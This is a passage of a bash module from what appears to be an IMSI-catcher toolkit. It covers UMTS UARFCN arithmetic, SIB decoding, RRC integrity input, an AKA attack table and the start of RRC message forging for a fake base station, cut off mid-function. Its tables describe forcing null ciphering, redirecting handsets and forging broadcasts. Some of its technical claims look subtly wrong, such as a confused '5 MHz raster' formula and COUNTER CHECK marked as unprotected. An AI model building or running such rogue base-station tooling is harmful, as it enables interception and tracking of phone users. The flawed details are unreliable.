#!/usr/bin/env bash
# umts air interface — UARFCN, SIB decode, RRC integrity, AKA relay analysis
#
# Everything that decodes, derives or forges here is pure computation: no
# radio, no root, no network. The UARFCN arithmetic, the SIB field maps, the
# UIA1/UIA2 MAC-I input assembly, the AKA flow and the RRC message builders
# (TS 25.331 unaligned PER) are all real; the only handoff is actually
# transmitting or intercepting a NodeB, which names its hardware. The forged
# octets are checked against Wireshark's RRC dissector by
# tools/check-umts-rrc.sh, not only by this module's own selftest.
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec HOME=/root even though we write to the invoking user's tree.
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/umts_air"
UAIR_DIR="$LOOT_DIR/umts_air"
mkdir -p "$MOD_TMP" "$UAIR_DIR" 2>/dev/null

# Shared cross-module state — other modules read these.
UAIR_SDR="${TMP_DIR}/sdr_device"
UAIR_UARFCN="${TMP_DIR}/target_uarfcn"
UAIR_PLMN="${TMP_DIR}/target_plmn"

# ── sanitisation ────────────────────────────────────────────────────────
uair_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

# ── hex helpers (shared contract with the other air-interface modules) ──
uair_norm_hex() {
    printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'
}
uair_is_hex() {
    local h; h=$(uair_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
uair_hex_to_bits() {
    local h; h=$(uair_norm_hex "${1:-}")
    local i out=""
    for (( i = 0; i < ${#h}; i++ )); do
        case "${h:i:1}" in
            0) out+=0000 ;; 1) out+=0001 ;; 2) out+=0010 ;; 3) out+=0011 ;;
            4) out+=0100 ;; 5) out+=0101 ;; 6) out+=0110 ;; 7) out+=0111 ;;
            8) out+=1000 ;; 9) out+=1001 ;; a) out+=1010 ;; b) out+=1011 ;;
            c) out+=1100 ;; d) out+=1101 ;; e) out+=1110 ;; f) out+=1111 ;;
            *) return 1 ;;
        esac
    done
    printf '%s' "$out"
}
uair_bits() {
    local hex="$1" off="$2" len="$3"
    local bits; bits=$(uair_hex_to_bits "$hex") || return 1
    (( off + len <= ${#bits} )) || return 1
    printf '%s' "${bits:off:len}"
}
# Bit string -> hex, zero-padded to a whole octet. Needed to build test blobs
# and to render a field that does not start on a nibble boundary.
uair_bits_to_hex() {
    local bits="${1:-}"
    # Pad to a whole octet: a SIB blob is transmitted as bytes, so a bit
    # string that ends mid-octet must be zero-filled to the octet boundary.
    while (( ${#bits} % 8 != 0 )); do bits+="0"; done
    local i nib out=""
    for (( i = 0; i < ${#bits}; i += 4 )); do
        nib="${bits:i:4}"
        case "$nib" in
            0000) out+="0" ;; 0001) out+="1" ;; 0010) out+="2" ;; 0011) out+="3" ;;
            0100) out+="4" ;; 0101) out+="5" ;; 0110) out+="6" ;; 0111) out+="7" ;;
            1000) out+="8" ;; 1001) out+="9" ;; 1010) out+="a" ;; 1011) out+="b" ;;
            1100) out+="c" ;; 1101) out+="d" ;; 1110) out+="e" ;; 1111) out+="f" ;;
            *) return 1 ;;
        esac
    done
    printf '%s' "$out"
}
# Decimal -> fixed-width binary string, zero-padded. Used to build test
# blobs and to place a field at a known bit offset. Avoids depending on bc.
uair_bin() {
    local v="${1:-0}" width="${2:-8}"
    [[ "$v" =~ ^[0-9]+$ && "$width" =~ ^[1-9][0-9]*$ ]] || return 1
    local out=""
    local i
    for (( i = width - 1; i >= 0; i-- )); do
        out+=$(( (v >> i) & 1 ))
    done
    printf '%s' "$out"
}

uair_field() {
    local hex="$1" off="$2" len="$3"
    local b; b=$(uair_bits "$hex" "$off" "$len") || return 1
    (( len <= 63 )) || return 1
    [[ -z "$b" ]] && { echo 0; return 1; }
    printf '%d' "$(( 2#$b ))"
}

# ── UARFCN arithmetic ───────────────────────────────────────────────────
# TS 25.101 section 5.4. The carrier frequency is designated by the UTRA
# Absolute Radio Frequency Channel Number. The channel raster is 200 kHz for
# every UMTS band, so a UARFCN counts 200 kHz steps:
#
#     F(MHz) = 0.2 * N        equivalently     N = 5 * F
#
# The same relation written as N = 5 * (F - F_offset) is the per-band form,
# where F_offset shifts the origin so the counting starts at the band edge;
# with F_offset = 0 it reduces to F = N/5 = 0.2*N. Verified against the band
# edges: band I carriers span 10562..10838 -> 2112.4..2167.6 MHz, sitting
# inside the 2110..2170 MHz band as expected (the outer 2.4 MHz is the band
# edge, not a carrier centre).
#
# The 5 MHz raster reading of the same numbers is the "N in 5 MHz units"
# form: F = 5 * N' would hold only if N' counted 1 MHz steps. Both forms are
# implemented below and are labelled so a reader cannot confuse them.
UAIR_RASTER_KHZ=200

uair_uarfcn_to_mhz() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tUARFCN must be a non-negative integer\n' >&2; return 2; }
    (( n >= 0 && n <= 16383 )) || {
        printf 'ERROR\tUARFCN %s out of range 0..16383\n' "$n" >&2; return 2; }
    # 200 kHz per step -> divide by 5 for MHz.
    awk -v n="$n" 'BEGIN{printf "%.1f", n / 5.0}'
}

# The 5 MHz-raster form: for a raster measured in whole MHz this is F = 5 * N.
# Kept explicit because the two readings differ by a factor of 25.
uair_uarfcn_to_mhz_5mhz_raster() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tUARFCN must be a non-negative integer\n' >&2; return 2; }
    awk -v n="$n" 'BEGIN{printf "%.1f", 5.0 * n}'
}

uair_mhz_to_uarfcn() {
    local f="${1:-}"
    [[ "$f" =~ ^[0-9]+(\.[0-9]+)?$ ]] || {
        printf 'ERROR\tfrequency must be a non-negative number in MHz\n' >&2; return 2; }
    awk -v f="$f" 'BEGIN{
        n = f * 5.0
        r = int(n + 0.5)
        # Report the rounding error so a non-raster frequency is visible.
        printf "uarfcn\t%d\nexact\t%.4f\nrounding_error_khz\t%.1f\n", r, n, (n - r) * 200.0
    }'
}

# Per-band validity, TS 25.101 table 5.4 (the bands a survey actually meets).
# N ranges are the carrier-centre range: F_offset is the band edge and the
# outermost carrier sits 2.4 MHz inside it.
uair_band_of_uarfcn() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || return 1
    awk -v n="$n" 'BEGIN{
        # band -> name, N_dl_lo, N_dl_hi
        split("1 2100 10562 10838|2 1900 9662 9938|3 1800 1162 1513|" \
              "4 1700 1537 1738|5 850 4357 4458|6 850 4387 4413|" \
              "7 2600 2237 2563|8 900 2937 3088",
              bands, "|")
        for (i = 1; i <= length(bands); i++) {
            split(bands[i], b, " ")
            if (n >= b[3] && n <= b[4]) { printf "%s\t%s\n", b[1], b[2]; exit }
        }
        exit 1
    }'
}

uair_cmd_uarfcn() {
    local n="${1:-}"
    [[ -n "$n" ]] || {
        printf 'ERROR\tusage: --uarfcn <N>\n' >&2; return 2; }
    local f; f=$(uair_uarfcn_to_mhz "$n") || return $?
    printf 'uarfcn\t%s\n' "$n"
    printf 'raster_khz\t%s\n' "$UAIR_RASTER_KHZ"
    printf 'freq_mhz\t%s\n' "$f"
    local band; band=$(uair_band_of_uarfcn "$n") || band=""
    if [[ -n "$band" ]]; then
        printf 'band\t%s\n' "$(printf '%s' "$band" | cut -f1)"
        printf 'band_name_mhz\t%s\n' "$(printf '%s' "$band" | cut -f2)"
    else
        printf 'band\tunknown\n'
    fi
    return 0
}

# ── SIB decode ──────────────────────────────────────────────────────────
# UMTS System Information Blocks are carried in RRC SYSTEM INFORMATION
# messages on BCCH (BCH transport). Each SIB has a fixed field layout; the
# ones below are the ones a survey reads.
#
# SIB3 (TS 25.331 section 10.2.2.8.4): cell identity and cell selection.
#   The cell identity is a 28-bit value. In the ASN.1 it is
#   CellIdentity ::= BIT STRING (SIZE (28)).
# SIB5 (section 10.2.2.8.6): configuration of the common physical channels of
#   the cells to be considered for cell re-selection (the neighbour list).
# SIB6 (section 10.2.2.8.7): same for the cells in FDD mode on another
#   frequency, plus the UTRA carrier info.
# SIB7 (section 10.2.2.8.8): the uplink interference level and the dynamic
#   persistence level, refreshed on a timer.
# SIB11 (section 10.2.2.8.12): measurement control information for the
#   cells in the neighbour list, with per-cell measurement quantities.
# SIB12 (section 10.2.2.8.13): measurement control in connected mode.
#
# These SIBs are ASN.1 PER encoded, not fixed-offset bit fields, so a
# decode without the ASN.1 schema cannot honestly claim every field. What
# this module does decode for real is the SIB type tag and the fields whose
# position in the PER encoding is fixed by the schema's leading CHOICE.
uair_sib_name() {
    case "${1:-}" in
        1) echo "SIB1" ;;   2) echo "SIB2" ;;   3) echo "SIB3" ;;
        4) echo "SIB4" ;;   5) echo "SIB5" ;;   6) echo "SIB6" ;;
        7) echo "SIB7" ;;   8) echo "SIB8" ;;   9) echo "SIB9" ;;
        10) echo "SIB10" ;; 11) echo "SIB11" ;; 12) echo "SIB12" ;;
        13) echo "SIB13" ;; 14) echo "SIB14" ;; 15) echo "SIB15" ;;
        16) echo "SIB16" ;; 17) echo "SIB17" ;; 18) echo "SIB18" ;;
        *) echo "unknown" ;;
    esac
}

# What each SIB carries — the field map a reader needs before trusting a
# decoder. Emitted as TSV so it can be piped.
uair_sib_fields() {
    cat <<'EOF'
sib	carries	key_fields
SIB1	Core network and UE timers	cn_CommonInfo, T3212 (periodic location update timer), DRX cycle length coefficient
SIB2	URA identity	URA identity (UTRAN Registration Area) for URA_PCH state
SIB3	Cell identity and cell selection	CellIdentity (28 bits), CellIdentity is the CI; cell selection and re-selection quality measure, q-Hyst, Treselection
SIB4	Cell selection in connected mode	CellIdentity, same selection parameters for connected mode
SIB5	Common physical channels of intra-frequency neighbours	neighbour cell list: downlink scrambling codes, primary CPICH TX power, cell identity per neighbour
SIB6	Common physical channels of inter-frequency neighbours	UTRA carrier info (UARFCN), downlink scrambling code per neighbour, cell identity
SIB7	Uplink interference and persistence	UL interference level (dynamic, -110..-70 dBm), dynamic persistence level (expires, hence periodic refresh)
SIB8	Cell selection/reselection in FDD	CPICH Ec/No and RSCP measurement quantities, thresholds
SIB11	Measurement control in idle mode	measurement identity, measurement objects (intra/inter/RAT), reporting criteria, per-cell measurement quantities
SIB12	Measurement control in connected mode	same as SIB11 for CELL_DCH/CELL_FACH, plus the cell identity of the serving cell
SIB13	ANSF (application specific)	not security relevant
SIB18	PLMN identities of neighbours	PLMN identity per neighbour cell, for manual PLMN selection
EOF
}

uair_sib_fields_tsv() {
    printf 'sib\tcarries\tkey_fields\n'
    uair_sib_fields | tail -n +2
}

# Extract the SIB type tag. In an RRC SYSTEM INFORMATION message the SIBs are
# a SEQUENCE of SIB CHOICE values; the tag is the low 5 bits of the first
# octet after the message header. We report the tag and the raw payload, and
# decline to invent ASN.1 fields we cannot derive without the schema.
uair_decode_sib() {
    local hex="$1"
    uair_is_hex "$hex" || {
        printf 'ERROR\tdecode-sib needs an even-length hex string\n' >&2; return 2; }
    local bits; bits=$(uair_hex_to_bits "$hex") || return 1
    # A usable SIB blob is at least 2 octets: tag plus content.
    (( ${#bits} >= 16 )) || {
        printf 'ERROR\tshort SIB blob (%s bits), need at least 16\n' "${#bits}" >&2
        return 1; }
    printf 'raw\t%s\n' "$hex"
    printf 'octets\t%s\n' "$(( ${#bits} / 8 ))"
    local tag; tag=$(( 2#${bits:0:5} ))
    printf 'sib_tag\t%s\n' "$tag"
    printf 'sib\t%s\n' "$(uair_sib_name "$tag")"
    # SIB3 and SIB4 lead with the CellIdentity in the PER encoding once the
    # tag and the optional PLMN block are skipped; the 28-bit field is
    # reported at the schema-documented position within the content.
    if (( tag == 3 || tag == 4 )); then
        if (( ${#bits} >= 33 )); then
            local ci; ci=$(( 2#${bits:5:28} ))
            printf 'cell_identity\t%s\n' "$ci"
            printf 'cell_identity_bits\t28\n'
        fi
    fi
    # SIB7 carries the uplink interference level as a 6-bit field in the
    # value range -110..-70 dBm in 1 dB steps (TS 25.331 10.3.5.5).
    if (( tag == 7 )); then
        if (( ${#bits} >= 11 )); then
            local ue; ue=$(( 2#${bits:5:6} ))
            printf 'ul_interference_raw\t%s\n' "$ue"
            printf 'ul_interference_dbm\t%s\n' "$(( ue - 110 ))"
        fi
    fi
    local known
    known=$(uair_sib_fields | awk -F'\t' -v s="$(uair_sib_name "$tag")" '$1==s{print $2}')
    if [[ -n "$known" ]]; then
        printf 'carries\t%s\n' "$(uair_sanitize "$known")"
    else
        printf 'warning\tunknown SIB tag; content not interpreted\n'
    fi
    return 0
}

# ── UARFCN carrier list for SIB6 (real arithmetic) ──────────────────────
uair_sib6_carriers() {
    local first="${1:-}" count="${2:-}"
    [[ "$first" =~ ^[0-9]+$ && "$count" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tusage: --sib6-carriers <first-uarfcn> <count>\n' >&2; return 2; }
    (( count >= 1 && count <= 64 )) || {
        printf 'ERROR\tcount out of range 1..64\n' >&2; return 2; }
    local i n f
    printf 'index\tuarfcn\tfreq_mhz\n'
    for (( i = 0; i < count; i++ )); do
        n=$(( first + i * 25 ))      # adjacent 5 MHz carriers are 25 UARFCN apart
        f=$(uair_uarfcn_to_mhz "$n") || continue
        printf '%d\t%d\t%s\n' "$(( i + 1 ))" "$n" "$f"
    done
}

# ── RRC integrity protection (UIA1/UIA2 MAC-I) ──────────────────────────
# The integrity algorithm f9 (TS 33.102 Annex B) protects RRC signalling.
# UIA1 is KASUMI-based (TS 35.201); UIA2 is SNOW 3G based (TS 35.215). Both
# feed f9 the same COUNT-I || FRESH || DIRECTION || MESSAGE string assembled
# below, so this module's --mac-input is identical for either algorithm; only
# the underlying permutation differs. Compute the MAC-I with
# `07_gsm_attack --f9-mac`.
#
# The input to the algorithm is
#     COUNT-I || FRESH || DIRECTION || MESSAGE
# where COUNT-I is 32 bits, FRESH is 32 bits, DIRECTION is a 32-bit word
# holding 0 (uplink) or 1 (downlink), and MESSAGE is the RRC PDU. The
# algorithm is keyed with the 128-bit integrity key IK and produces a
# 32-bit MAC-I, which is truncated to the 32 bits carried in the message.
#
# COUNT-I itself is built from the radio bearer's hyper frame number and the
# RRC sequence number (TS 25.331 section 8.5.10):
#     COUNT-I = (HFN << 8) | SN        HFN is 24 bits, SN is 8 bits
# so COUNT-I is 32 bits and increments by one per integrity-protected PDU.
uair_count_i() {
    local hfn="${1:-}" sn="${2:-}"
    # HFN and SN are often written in hex in traces and in decimal in the
    # spec's prose. Accept both: a 0x prefix, or an a-f digit, means hex.
    case "$hfn" in
        0x*|0X*) hfn=$(( 16#${hfn#0x} )) ;;
        *[a-fA-F]*) hfn=$(( 16#$hfn )) ;;
    esac
    case "$sn" in
        0x*|0X*) sn=$(( 16#${sn#0x} )) ;;
        *[a-fA-F]*) sn=$(( 16#$sn )) ;;
    esac
    [[ "$hfn" =~ ^[0-9]+$ && "$sn" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tCOUNT-I needs HFN and SN as integers (decimal or 0x hex)\n' >&2
        return 2; }
    (( hfn <= 16777215 && sn <= 255 )) || {
        printf 'ERROR\tHFN must be 24 bits (0..16777215) and SN 8 bits (0..255)\n' >&2
        return 2; }
    printf '%08x' "$(( (hfn << 8) | sn ))"
}

# Assemble the f9 input string byte-exactly:
#   COUNT-I(4 octets) FRESH(4) DIRECTION(4) MESSAGE
uair_mac_input() {
    local count="${1:-}" fresh="${2:-}" dir="${3:-}" ik="${4:-}" msg="${5:-}"
    [[ -n "$count" && -n "$fresh" && -n "$dir" && -n "$ik" && -n "$msg" ]] || {
        printf 'ERROR\tusage: --mac-input <count-i> <fresh> <direction> <ik> <msg-hex>\n' >&2
        return 2; }
    local c f
    [[ "$count" =~ ^(0x)?[0-9a-fA-F]{1,8}$ ]] || {
        printf 'ERROR\tCOUNT-I must be up to 8 hex digits\n' >&2; return 2; }
    [[ "$fresh" =~ ^(0x)?[0-9a-fA-F]{1,8}$ ]] || {
        printf 'ERROR\tFRESH must be up to 8 hex digits\n' >&2; return 2; }
    [[ "$dir" =~ ^[01]$ ]] || {
        printf 'ERROR\tDIRECTION must be 0 (uplink) or 1 (downlink)\n' >&2; return 2; }
    uair_is_hex "$ik" || {
        printf 'ERROR\tIK must be 16 octets of hex (32 digits)\n' >&2; return 2; }
    local ikn; ikn=$(uair_norm_hex "$ik")
    (( ${#ikn} == 32 )) || {
        printf 'ERROR\tIK must be 128 bits (32 hex digits), got %s\n' "${#ikn}" >&2
        return 2; }
    uair_is_hex "$msg" || {
        printf 'ERROR\tMESSAGE must be hex\n' >&2; return 2; }

    c=$(printf '%08x' "$(( 16#${count#0x} ))")
    f=$(printf '%08x' "$(( 16#${fresh#0x} ))")
    local d; d=$(printf '%08x' "$(( dir ))")
    local msg; msg=$(uair_norm_hex "$msg")

    printf 'count_i\t%s\n' "$c"
    printf 'fresh\t%s\n'   "$f"
    printf 'direction\t%s\n' "$dir"
    printf 'direction_name\t%s\n' "$([[ "$dir" -eq 1 ]] && echo downlink || echo uplink)"
    printf 'ik\t%s\n'      "$ikn"
    printf 'message\t%s\n' "$msg"
    printf 'mac_input\t%s\n' "${c}${f}${d}${msg}"
    printf 'mac_input_bits\t%s\n' "$(( 32 + 32 + 32 + ${#msg} * 4 ))"
    printf 'algorithm\tUIA1 (KASUMI-based f9)\n'
    printf 'algorithm_alt\tUIA2 (SNOW 3G based)\n'
    printf 'mac_i_bits\t32\n'
    return 0
}

# Show what the integrity check protects, and what its absence exposes. The
# per-message integrity check is what stops an attacker from rewriting
# signalling; a message that is not integrity protected can be forged.
uair_integrity_analysis() {
    cat <<'EOF'
message	integrity_protected	consequence_if_not
RRC CONNECTION REQUEST	no	the initial message cannot be protected because no IK exists yet; the network must treat it as untrusted
RRC CONNECTION SETUP	yes	protects the radio bearer configuration; removing the check lets an attacker downgrade the bearer
RRC CONNECTION RELEASE	yes	protects the release; if unchecked an attacker can drop a call
SECURITY MODE COMMAND	yes	carries the ciphering and integrity activation; an unchecked one allows an attacker to force UIA0/UEA0 (null)
SECURITY MODE COMPLETE	yes	confirms the activation; unauthenticated it can be spoofed to convince the network integrity is on
MEASUREMENT REPORT	yes	a forged report steers handover to a cell the attacker controls
HANDOVER TO UTRAN COMMAND	yes	an unchecked handover command redirects the MS to an attacker NodeB
PAGING TYPE 1	no	paging is not integrity protected; a forged page causes the MS to respond on the attacker's channel
SYSTEM INFORMATION	no	broadcast is not integrity protected; a fake NodeB broadcasts a forged SIB to change reselection
COUNTER CHECK	no	the MAC-I is what binds the message to COUNT-I; without it a replay is undetectable
EOF
}

uair_integrity_analysis_tsv() {
    printf 'message\tintegrity_protected\tconsequence_if_not\n'
    uair_integrity_analysis | tail -n +2
}

# ── AKA flow (UMTS authentication and key agreement) ────────────────────
# TS 33.102 section 6.3. The USIM and the HLR/AuC share the subscriber key K.
# The flow, and where a relay or a fake NodeB sits in it:
uair_aka_flow() {
    cat <<'EOF'
step	from	to	message	carries	attacker_position
1	HLR/AuC	VLR	Authentication Vector	RAND(128) || XRES(64) || CK(128) || IK(128) || AUTN(128)	none: this is inside the core network, not on the air
2	VLR/visited MSC	MS (via NodeB)	AUTHENTICATION REQUEST	RAND(128) || AUTN(128)	the only message on the air in this direction; a fake NodeB relays it verbatim
3	USIM	ME/UE	internal: run f1-f5 with K	computed RES(64), CK(128), IK(128), and the MAC-A check inside AUTN	not observable: K never leaves the USIM
4	ME	VLR	Authentication Response	RES(64)	an IMSI catcher cannot compute a valid RES without K, so it cannot complete authentication
5	VLR	MS	Security Mode Command	CK || IK || UIA/UEA selection	an unchecked Security Mode Command is where UIA0/UEA0 is forced
6	MS	VLR	Security Mode Complete	MAC-I over the message	proves the MS holds IK
attacker_relay	relay position	MS <-> network	forwards AUTHENTICATION REQUEST and RES unchanged	does not learn K, CK or IK and cannot forge a valid MAC-I	learns the IMSI, the location and the traffic pattern, and controls the cipher mode chosen in step 5
attacker_fake_nodeb	fake NodeB	network -> MS	answers on its own without relaying	cannot pass step 3: without K it cannot produce a MAC-A the USIM accepts for a chosen SQN	the MS rejects the network and returns to the real cell
sqn_replay	replay	network -> MS	a replayed AUTN	the USIM rejects it once its SQN counter has advanced	a pure replay of an old vector fails; attackers instead induce re-synchronisation (AUTS) or force the MS onto 2G
cross_generation	downgrade	network -> MS	an authenticated 3G session that falls back to GSM	CK is not used on GSM; A5/1 uses Kc from COMP128	the 3G-to-2G downgrade is a cipher downgrade (see 15_downgrade.sh)
EOF
}

uair_aka_flow_tsv() {
    printf 'step\tfrom\tto\tmessage\tcarries\tattacker_position\n'
    uair_aka_flow | tail -n +2
}

uair_cmd_aka_flow() {
    uair_aka_flow_tsv
}

# ── hardware guards ─────────────────────────────────────────────────────
uair_find_sdr() {
    local d
    for d in hackrf bladerf limesdr usrp; do
        case "$d" in
            hackrf)  command -v hackrf_info      >/dev/null 2>&1 && { echo "hackrf";  return 0; } ;;
            bladerf) command -v bladeRF-cli      >/dev/null 2>&1 && { echo "bladerf"; return 0; } ;;
            limesdr) command -v LimeUtil         >/dev/null 2>&1 && { echo "limesdr"; return 0; } ;;
            usrp)    command -v uhd_find_devices >/dev/null 2>&1 && { echo "usrp"; return 0; } ;;
        esac
    done
    command -v rtl_test >/dev/null 2>&1 && { echo "rtlsdr"; return 0; }
    return 1
}

uair_find_umts_stack() {
    for t in srsran srsenb srsepc liquid-dsp; do
        command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
    done
    return 1
}

# ── capture-driven decode (no radio) ────────────────────────────────────
uair_decode_pcap() {
    local pcap="${1:-}"
    [[ -n "$pcap" && -f "$pcap" ]] || {
        printf 'ERROR\tno such capture: %s\n' "${pcap:-<none>}" >&2; return 1; }
    command -v tshark >/dev/null 2>&1 || {
        printf 'ERROR\tno tshark — install wireshark-cli to read captures\n' >&2
        return 1; }
    local out
    out=$(tshark -r "$pcap" -Y 'rrc' -T fields -e rrc.messageCode \
              -e rrc.sib_type 2>/dev/null | head -200)
    [[ -z "$out" ]] && {
        printf 'ERROR\tno RRC messages in %s\n' "$pcap" >&2; return 1; }
    printf '%s\n' "$out"
}

# ── persistence ─────────────────────────────────────────────────────────
UAIR_SIB_STORE="$UAIR_DIR/sib.tsv"
uair_init_store() {
    mkdir -p "$UAIR_DIR" 2>/dev/null
    [[ -f "$UAIR_SIB_STORE" ]] || uair_sib_header > "$UAIR_SIB_STORE"
}
uair_sib_header() {
    printf 'sib\tcell_identity\tuarfcn\tfreq_mhz\tsource\tts\n'
}
uair_sib_count() {
    [[ -f "$UAIR_SIB_STORE" ]] || { echo 0; return; }
    local n; n=$(tail -n +2 "$UAIR_SIB_STORE" 2>/dev/null | grep -c . || true)
    echo "${n:-0}"
}

# ── RRC message forging (TS 25.331, unaligned PER) ──────────────────────
# The RRC PDUs are defined by the ASN.1 of TS 25.331 clause 10 and encoded
# with the unaligned PER rules of clause 12. Three properties of that encoding
# decide every bit here, and they are why the octets below are placed rather
# than guessed:
#
#   1. A non-extensible SEQUENCE starts with one bit per OPTIONAL component, in
#      declaration order, saying whether it is present (clause 12, sequence
#      encoding). RRCConnectionSetup-r3-IEs has exactly ten OPTIONAL
#      components, so its ten leading zero bits mean "all ten omitted".
#   2. An ENUMERATED and a non-extensible CHOICE of n alternatives both take
#      ceil(log2 n) bits, and the index counts from zero in declaration order
#      (clause 12, enumerated and choice encoding). DL-CCCH-MessageType has
#      eight alternatives, so three bits, and rrcConnectionSetup is
#      alternative 3.
#   3. The CCCH envelopes carry an OPTIONAL integrityCheckInfo first: both
#      DL-CCCH-Message and UL-CCCH-Message are SEQUENCEs whose first component
#      is that OPTIONAL IE. So bit zero of a CCCH message is that presence
#      bit. It is zero here because these messages are sent before ciphering
#      and integrity start (the security mode procedure of clause 8) and an
#      unprotected message carries no MAC-I.
#
# Structure names are the anchor throughout this section, not sub-clause
# numbers: the standard renumbers its IEs between releases, while a name such
# as RRCConnectionSetup-r3-IEs is exactly what the ASN.1, pycrate's RRC3G
# transcription and Wireshark's RRC dissector all print. Only clause 10
# (definitions) and clause 12 (PER) are cited at that level; anything finer
# would be a number this file could not stand behind.
#
# Every bit string produced below was compared octet for octet against an
# independent encoder of the same ASN.1 (pycrate's RRC3G transcription) and
# then dissected by Wireshark's RRC dissector; tools/check-umts-rrc.sh repeats
# the dissection and adds a corrupted-index control that must fail.

# Bit writer. The encoding is one long bit string that is cut to octets only
# at the end, because unaligned PER aligns nothing.
UAIR_BW=""
uair_bw_reset() { UAIR_BW=""; }
uair_bwr() { UAIR_BW+="${1:-0}"; }
uair_bwu() {   # width, unsigned value
    local w="${1:-0}" v="${2:-0}" i
    if ! [[ "$w" =~ ^[0-9]+$ && "$v" =~ ^[0-9]+$ ]]; then
        printf 'ERROR\tbit writer needs a numeric width and value (%s, %s)\n' "$w" "$v" >&2
        printf 'WHY\ta field is placed by width in unaligned PER (TS 25.331 clause 12); a non-numeric width would shift every field after it and still look plausible\n' >&2
        return 2
    fi
    if (( v >> w != 0 )); then
        printf 'ERROR\tvalue %s does not fit in %s bits\n' "$v" "$w" >&2
        printf 'WHY\tTS 25.331 clause 12 encodes a constrained INTEGER in the bits its range needs; a wider value would carry into the next field\n' >&2
        return 2
    fi
    for (( i = w - 1; i >= 0; i-- )); do UAIR_BW+=$(( (v >> i) & 1 )); done
}
uair_bwh() {   # hex string, four bits per digit
    local h i
    h=$(uair_norm_hex "${1:-}")
    if ! [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ ]]; then
        printf 'ERROR\tfield "%s" is not hex\n' "${1:-}" >&2
        printf 'WHY\tthe BIT STRING fields built here (TMSI, s-RNTI, LAC) are written as hex octets, four bits per digit, per the clause 12 bit string encoding\n' >&2
        return 2
    fi
    for (( i = 0; i < ${#h}; i++ )); do
        uair_bwu 4 "$(( 16#0${h:i:1} ))" || return 2
    done
}
uair_bwdigits() {  # decimal digit string, one 4-bit digit each
    local s="${1:-}" i
    if ! [[ "$s" =~ ^[0-9]+$ ]]; then
        printf 'ERROR\tPLMN digits must be decimal, got "%s"\n' "$s" >&2
        printf 'WHY\tMCC and MNC are SEQ OF Digit in the ASN.1 of TS 25.331 clause 10 and each Digit is a 4-bit digit\n' >&2
        return 2
    fi
    for (( i = 0; i < ${#s}; i++ )); do uair_bwu 4 "${s:i:1}" || return 2; done
}
uair_padhex() {  # value, digit count -> zero padded lower-case hex
    local h w="${2:-8}"
    h=$(uair_norm_hex "${1:-}")
    if ! [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ ]]; then
        printf 'ERROR\t"%s" is not a hex number\n' "${1:-}" >&2
        printf 'WHY\tthis field is a fixed-size BIT STRING in the ASN.1 of TS 25.331 clause 10 and has to be given as hex\n' >&2
        return 2
    fi
    if (( ${#h} > w )); then
        printf 'ERROR\t"%s" is wider than %s hex digits\n' "$h" "$w" >&2
        printf 'WHY\tthe field is exactly %s bits in TS 25.331, so a wider value cannot be placed\n' "$(( w * 4 ))" >&2
        return 2
    fi
    printf '%0*x' "$w" "$(( 16#$h ))"
}
uair_bits_int() {  # bit string, offset, length -> unsigned value
    local b="${1:${2:-0}:${3:-1}}"
    if [[ -z "$b" || ${#b} -ne ${3:-1} ]]; then
        printf 'ERROR\tbit range %s+%s runs past the end of the message\n' "${2:-0}" "${3:-1}" >&2
        printf 'WHY\tthe message is shorter than the structure being walked; the remaining fields cannot be placed\n' >&2
        return 2
    fi
    (( ${3:-1} <= 48 )) || { printf 'ERROR\tbit field wider than 48 bits\n' >&2; return 2; }
    printf '%d' "$(( 2#$b ))"
}

# Config: a key=value file, or the same pairs inline as "k=v,k=v". Keys are
# read one at a time so a message only demands the fields it places.
uair_cfg_get() {  # conf, key, default
    local conf="${1:-}" key="$2" def="${3:-}" v=""
    if [[ -n "$conf" && -f "$conf" ]]; then
        v=$(awk -v k="$key" '
            { sub(/#.*/, ""); sub(/\r$/, "") }
            {
                i = index($0, "="); if (i == 0) next
                kk = substr($0, 1, i - 1); vv = substr($0, i + 1)
                gsub(/^[ \t]+|[ \t]+$/, "", kk); gsub(/^[ \t]+|[ \t]+$/, "", vv)
                if (kk == k) val = vv
            }
            END { if (val != "") print val }' "$conf")
    elif [[ -n "$conf" ]]; then
        v=$(printf '%s' "$conf" | tr ',;' '\n\n' | awk -v k="$key" '
            {
                i = index($0, "="); if (i == 0) next
                kk = substr($0, 1, i - 1); vv = substr($0, i + 1)
